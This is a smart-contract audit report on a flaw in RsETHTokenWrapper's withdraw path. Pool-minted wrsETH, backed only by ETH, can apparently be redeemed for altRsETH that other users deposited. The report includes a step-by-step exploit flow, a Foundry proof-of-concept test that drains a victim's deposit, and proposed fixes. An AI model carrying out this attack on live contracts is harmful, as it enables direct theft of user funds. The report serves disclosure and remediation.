Audit Report

## Title
Pool-minted wrsETH redeemable for wrapper-held altRsETH with no collateral backing — (`contracts/L2/RsETHTokenWrapper.sol`)

## Summary
`RsETHTokenWrapper` has two wrsETH issuance paths: `_deposit` (altRsETH-backed, 1:1) and `mint` (ETH-backed, called by pools). `_withdraw` does not distinguish between these paths — it burns any wrsETH and transfers altRsETH from the wrapper's balance. An attacker who obtains wrsETH via `RSETHPoolV2.deposit` or `RSETHPoolV3.deposit` (depositing only ETH) can immediately redeem it for altRsETH deposited by other users, constituting direct theft of user funds.

## Finding Description

**Path 1 — altRsETH-backed:** `_deposit` pulls altRsETH from the caller into the wrapper and mints an equal amount of wrsETH. The wrapper's altRsETH balance grows 1:1 with supply. [1](#0-0) 

**Path 2 — ETH-backed (pool mint):** `RSETHPoolV2.deposit` and `RSETHPoolV3.deposit` call `wrsETH.mint(msg.sender, rsETHAmount)` directly after receiving ETH. No altRsETH is deposited into the wrapper. [2](#0-1) [3](#0-2) [4](#0-3) 

**`_withdraw` has a single guard — `allowedTokens[_asset]` — then burns wrsETH and transfers altRsETH unconditionally:** [5](#0-4) 

There is no check that the wrsETH being burned was obtained via `_deposit` (altRsETH-backed) rather than via `mint` (ETH-backed). The `safeTransfer` at line 125 will succeed as long as the wrapper holds sufficient altRsETH — which it does when legitimate users have deposited via `_deposit`.

The function `maxAmountToDepositBridgerAsset` (lines 99–110) implicitly acknowledges the accounting gap (`totalSupply - altRsETH.balanceOf(wrapper)`), but `_withdraw` never consults it. [6](#0-5) 

**Exploit flow:**
1. Victim calls `wrapper.deposit(altRsETH, X)` → wrapper holds X altRsETH, victim holds X wrsETH.
2. Attacker calls `RSETHPoolV2.deposit{value: Y}("")` → pool calls `wrsETH.mint(attacker, Z)` → attacker holds Z wrsETH; wrapper's altRsETH balance unchanged.
3. Attacker calls `wrapper.withdraw(altRsETH, Z)` → `_withdraw` burns Z wrsETH, transfers Z altRsETH from wrapper to attacker.
4. Attacker receives altRsETH they never deposited; victim's altRsETH is gone.

## Impact Explanation
**Critical — direct theft of user funds.** Any user who deposited altRsETH via `deposit`/`depositTo` has their altRsETH at risk. The attacker receives a yield-bearing LST (altRsETH) in exchange for ETH that remains in the pool, extracting value directly from other users' deposits. This matches the allowed Critical impact: *Direct theft of any user funds, whether at-rest or in-motion*.

## Likelihood Explanation
**High.** The attack requires no special role, no governance action, and no oracle manipulation. The only prerequisites are: (1) `RSETHPoolV2`/`RSETHPoolV3` holds `MINTER_ROLE` on the wrapper (the intended production deployment), and (2) at least one user has deposited altRsETH into the wrapper. Both are normal operating conditions. The attacker needs only ETH. The attack is repeatable up to the wrapper's altRsETH balance.

## Recommendation
Separate the two wrsETH issuance paths at the redemption layer:

1. **Track pool-minted supply.** Maintain a `mintedByPool` counter incremented in `mint()` and decremented when pool-minted wrsETH is burned via a separate redemption path. `_withdraw` should only allow redemption up to `altRsETH.balanceOf(address(this))`, enforced by requiring `totalSupply() - mintedByPool <= altRsETH.balanceOf(address(this))` before each withdrawal.
2. **Solvency guard in `_withdraw`.** Add a check: `require(altRsETH.balanceOf(address(this)) >= _amount && totalSupply() - _amount >= altRsETH.balanceOf(address(this)) - _amount)` — i.e., only allow withdrawal when the wrapper remains fully collateralised after the burn.
3. **Separate token types.** Issue a distinct token for pool deposits vs. altRsETH deposits so pool-minted tokens cannot be redeemed for altRsETH.

## Proof of Concept

```solidity
// Foundry fork test (L2 chain where RSETHPoolV2 has MINTER_ROLE on wrapper)
function testStealAltRsETH() public {
    // 1. Victim deposits altRsETH into wrapper
    uint256 victimAmount = 1e18;
    vm.startPrank(victim);
    altRsETH.approve(address(wrapper), victimAmount);
    wrapper.deposit(address(altRsETH), victimAmount);
    vm.stopPrank();
    assertEq(altRsETH.balanceOf(address(wrapper)), victimAmount);

    // 2. Attacker deposits ETH into pool → receives wrsETH via mint()
    //    No altRsETH enters the wrapper
    vm.deal(attacker, 1 ether);
    vm.startPrank(attacker);
    pool.deposit{value: 1 ether}("ref");
    uint256 attackerWrsETH = wrapper.balanceOf(attacker);
    assertGt(attackerWrsETH, 0);

    // 3. Attacker redeems pool-minted wrsETH for victim's altRsETH
    uint256 stealAmount = attackerWrsETH < victimAmount ? attackerWrsETH : victimAmount;
    wrapper.withdraw(address(altRsETH), stealAmount);
    vm.stopPrank();

    // Attacker holds altRsETH they never deposited
    assertEq(altRsETH.balanceOf(attacker), stealAmount);
    // Victim's altRsETH is drained from the wrapper
    assertLt(altRsETH.balanceOf(address(wrapper)), victimAmount);
}
```

The `_withdraw` call succeeds because the only guard is `allowedTokens[_asset]` (line 121), and the attacker holds valid wrsETH obtained via `mint` rather than `_deposit`. [5](#0-4)
